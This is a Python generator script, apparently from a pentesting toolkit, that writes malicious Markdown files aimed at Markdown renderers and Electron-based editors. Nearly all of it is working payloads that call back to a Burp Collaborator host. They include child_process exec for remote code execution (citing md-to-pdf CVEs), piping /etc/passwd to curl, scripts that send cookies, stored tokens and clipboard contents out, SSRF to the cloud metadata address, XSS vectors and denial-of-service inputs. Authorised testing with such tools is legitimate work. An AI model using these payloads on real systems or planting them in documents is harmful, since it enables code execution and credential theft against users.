from pathlib import Path

try:
    from .ssti_filename_generator import generate_ssti_filename_payloads
    from .xss_filename_generator import generate_xss_filename_payloads
except ImportError:
    try:
        from ssti_filename_generator import generate_ssti_filename_payloads
        from xss_filename_generator import generate_xss_filename_payloads
    except ImportError:
        generate_ssti_filename_payloads = None
        generate_xss_filename_payloads = None

def generate_markdown_payloads(output_dir, burp_collab, tech_filter='all', payload_types=None):
    if payload_types is None:
        payload_types = {'all'}
    
    def should_generate_type(payload_type):
        return 'all' in payload_types or payload_type in payload_types
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    if should_generate_type('rce') or should_generate_type('deserialization'):
        rce_dir = output_dir / 'rce'
        rce_dir.mkdir(exist_ok=True)
    if should_generate_type('ssrf'):
        ssrf_dir = output_dir / 'ssrf'
        ssrf_dir.mkdir(exist_ok=True)
    if should_generate_type('xss'):
        xss_dir = output_dir / 'xss'
        xss_dir.mkdir(exist_ok=True)
    if should_generate_type('info_leak'):
        info_leak_dir = output_dir / 'info_leak'
        info_leak_dir.mkdir(exist_ok=True)
    if should_generate_type('dos'):
        dos_dir = output_dir / 'dos'
        dos_dir.mkdir(exist_ok=True)
    if should_generate_type('oob'):
        oob_dir = output_dir / 'oob'
        oob_dir.mkdir(exist_ok=True)
    
    md_rce1_xss_electron = '''# Test

<script>
require('child_process').exec('curl ''' + base_url + '''/rce1-electron');
</script>
'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce1_xss_electron.md", 'w', encoding='utf-8') as f:
            f.write(md_rce1_xss_electron)
    
    md_rce2_vnote_cve = '''# Test

<img src=x onerror="require('child_process').exec('cat /etc/passwd | curl -X POST -d @- ''' + base_url + '''/rce2-vnote')">
'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce2_vnote_cve.md", 'w', encoding='utf-8') as f:
            f.write(md_rce2_vnote_cve)
    
    md_rce3_marktext_dom = '''# Test

<details open ontoggle="require('child_process').exec('curl ''' + base_url + '''/rce3-marktext')">
</details>
'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce3_marktext_dom.md", 'w', encoding='utf-8') as f:
            f.write(md_rce3_marktext_dom)
    
    md_rce4_md_to_pdf = '''# Test - md-to-pdf code block RCE (CVE-2021-23639)

```javascript
require('child_process').exec('curl ''' + base_url + '''/rce4-md-to-pdf');
```
'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce4_md_to_pdf.md", 'w', encoding='utf-8') as f:
            f.write(md_rce4_md_to_pdf)
    
    md_rce5_oob_buffer = '''# Test

''' + 'A' * 100000 + '''

<script>
require('child_process').exec('curl ''' + base_url + '''/rce5-oob');
</script>
'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce5_oob_buffer.md", 'w', encoding='utf-8') as f:
            f.write(md_rce5_oob_buffer)
    
    md_rce6_internal_exec = '''# Test

```bash
#!/bin/bash
curl ''' + base_url + '''/rce6-internal
```
'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce6_internal_exec.md", 'w', encoding='utf-8') as f:
            f.write(md_rce6_internal_exec)
    
    md_rce7_frontmatter_js = '''---
title: Test
eval: require('child_process').exec('curl ''' + base_url + '''/rce7-frontmatter')
---

# Test
'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce7_frontmatter_js.md", 'w', encoding='utf-8') as f:
            f.write(md_rce7_frontmatter_js)
    
    # New CVE payload - md-to-pdf front-matter JavaScript RCE (CVE-2025-65108)
    md_rce_md_to_pdf_cve = '''---javascript
((require("child_process")).execSync("curl ''' + base_url + '''/rce-md-to-pdf-cve"))
---RCE
'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce_md_to_pdf_cve.md", 'w', encoding='utf-8') as f:
            f.write(md_rce_md_to_pdf_cve)
    
    md_ssrf1_image_link = '''# Test

![Image](''' + base_url + '''/ssrf1-image)
'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf1_image_link.md", 'w', encoding='utf-8') as f:
            f.write(md_ssrf1_image_link)
    
    md_ssrf2_internal_link = '''# Test

[Link](http://internal:8080/admin)
![Image](http://169.254.169.254/latest/meta-data/)
'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf2_internal_link.md", 'w', encoding='utf-8') as f:
            f.write(md_ssrf2_internal_link)
    
    md_ssrf3_markdown_to_pdf = '''# Test

![Image](''' + base_url + '''/ssrf3-pdf-convert)
[Link](http://localhost:8080/internal)
'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf3_markdown_to_pdf.md", 'w', encoding='utf-8') as f:
            f.write(md_ssrf3_markdown_to_pdf)
    
    md_xss1_details_ontoggle = '''# Test

<details open ontoggle=alert(1)>
</details>
'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss1_details_ontoggle.md", 'w', encoding='utf-8') as f:
            f.write(md_xss1_details_ontoggle)
    
    md_xss2_script_tag = '''# Test

<script>alert(document.cookie)</script>
'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss2_script_tag.md", 'w', encoding='utf-8') as f:
            f.write(md_xss2_script_tag)
    
    md_xss3_img_onerror = '''# Test

<img src=x onerror=alert(1)>
'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss3_img_onerror.md", 'w', encoding='utf-8') as f:
            f.write(md_xss3_img_onerror)
    
    md_xss4_svg_onload = '''# Test

<svg onload=alert(1)>
'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss4_svg_onload.md", 'w', encoding='utf-8') as f:
            f.write(md_xss4_svg_onload)
    
    md_xss5_mermaid_diagram = '''# Test

```mermaid
graph TD
    A[<script>alert(1)</script>] --> B
```
'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss5_mermaid_diagram.md", 'w', encoding='utf-8') as f:
            f.write(md_xss5_mermaid_diagram)
    
    md_xss6_iframe_src = '''# Test

<iframe src="javascript:alert(1)"></iframe>
'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss6_iframe_src.md", 'w', encoding='utf-8') as f:
            f.write(md_xss6_iframe_src)
    
    md_xss7_clipboard_paste = f'''# Test

<script>
navigator.clipboard.readText().then(text => fetch('{base_url}/xss-clipboard?data=' + encodeURIComponent(text)));
</script>
'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss7_clipboard_paste.md", 'w', encoding='utf-8') as f:
            f.write(md_xss7_clipboard_paste)
    
    md_info1_local_file_read = f'''# Test

<script>
fetch('file:///etc/passwd').then(r => r.text()).then(t => fetch('{base_url}/info-local?data=' + encodeURIComponent(t)));
</script>
'''
    if should_generate_type('info_leak'):
        with open(info_leak_dir / "info1_local_file_read.md", 'w', encoding='utf-8') as f:
            f.write(md_info1_local_file_read)
    
    md_info2_dom_leak = f'''# Test

<script>
fetch('{base_url}/info-dom?cookie=' + document.cookie + '&url=' + window.location);
</script>
'''
    if should_generate_type('info_leak'):
        with open(info_leak_dir / "info2_dom_leak.md", 'w', encoding='utf-8') as f:
            f.write(md_info2_dom_leak)
    
    md_info3_markdown_pdf_read = f'''# Test

```javascript
const fs = require('fs');
const data = fs.readFileSync('/etc/passwd', 'utf8');
fetch('{base_url}/info-pdf?data=' + encodeURIComponent(data));
```
'''
    if should_generate_type('info_leak'):
        with open(info_leak_dir / "info3_markdown_pdf_read.md", 'w', encoding='utf-8') as f:
            f.write(md_info3_markdown_pdf_read)
    
    md_info4_credentials_exfil = f'''# Test

<script>
const creds = localStorage.getItem('token') || sessionStorage.getItem('auth');
fetch('{base_url}/info-creds?data=' + encodeURIComponent(creds));
</script>
'''
    if should_generate_type('info_leak'):
        with open(info_leak_dir / "info4_credentials_exfil.md", 'w', encoding='utf-8') as f:
            f.write(md_info4_credentials_exfil)
    
    md_dos1_nested_lists = '''# Test

''' + '\n'.join(['  ' * i + '- Item ' + str(i) for i in range(1000)]) + '''
'''
    if should_generate_type('dos'):
        with open(dos_dir / "dos1_nested_lists.md", 'w', encoding='utf-8') as f:
            f.write(md_dos1_nested_lists)
    
    md_dos2_infinite_loop = '''# Test

[Link 1](link1)
[Link 1](link1)
[Link 1](link1)
''' + '\n'.join(['[Link ' + str(i) + '](link' + str(i) + ')' for i in range(10000)]) + '''
'''
    if should_generate_type('dos'):
        with open(dos_dir / "dos2_infinite_loop.md", 'w', encoding='utf-8') as f:
            f.write(md_dos2_infinite_loop)
    
    md_dos3_large_table = '''# Test

| Header 1 | Header 2 | Header 3 |
|----------|----------|----------|
''' + '\n'.join(['| ' + ' | '.join(['Cell'] * 3) + ' |' for _ in range(10000)]) + '''
'''
    if should_generate_type('dos'):
        with open(dos_dir / "dos3_large_table.md", 'w', encoding='utf-8') as f:
            f.write(md_dos3_large_table)
    
    md_oob1_buffer_overflow = '''# Test

''' + 'A' * 200000 + '''

<script>alert(1)</script>
'''
    if should_generate_type('oob'):
        with open(oob_dir / "oob1_buffer_overflow.md", 'w', encoding='utf-8') as f:
            f.write(md_oob1_buffer_overflow)
    
    md_oob2_string_parsing = f'''# Test

{'[' * 50000}{']' * 50000}

<script>require('child_process').exec('curl {base_url}/oob2-string');</script>
'''
    if should_generate_type('oob'):
        with open(oob_dir / "oob2_string_parsing.md", 'w', encoding='utf-8') as f:
            f.write(md_oob2_string_parsing)
    
    md_master = f'''---
title: Test
eval: require('child_process').exec('curl {base_url}/master')
---

# Test

![Image]({base_url}/ssrf-master)

<details open ontoggle=alert(1)>
</details>

<script>
require('child_process').exec('curl {base_url}/rce-master');
fetch('{base_url}/info-master?cookie=' + document.cookie);
</script>

{'A' * 50000}
'''
    with open(output_dir / "master.md", 'w', encoding='utf-8') as f:
            f.write(md_master)
    
    if generate_ssti_filename_payloads and should_generate_type('ssti'):
        generate_ssti_filename_payloads(output_dir, 'md', burp_collab, tech_filter)
    
    if generate_xss_filename_payloads and should_generate_type('xss'):
        generate_xss_filename_payloads(output_dir, 'md', burp_collab, tech_filter)

